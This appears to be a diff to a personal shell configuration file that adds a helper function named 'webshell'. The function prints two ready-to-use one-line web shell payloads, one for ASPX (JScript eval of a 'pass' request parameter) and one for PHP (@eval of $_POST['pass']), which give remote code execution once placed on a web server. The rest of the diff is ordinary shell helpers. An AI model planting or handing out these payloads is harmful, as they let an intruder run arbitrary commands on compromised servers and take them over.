@@ -154,3 +154,9 @@ function killport(){
 function da(){
     docker exec -it $1 bash
 }
+
+function webshell(){
+    echo "aspx : <%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%>"
+    echo "php : <?php @eval(\$_POST['pass']);?>"
+
+}
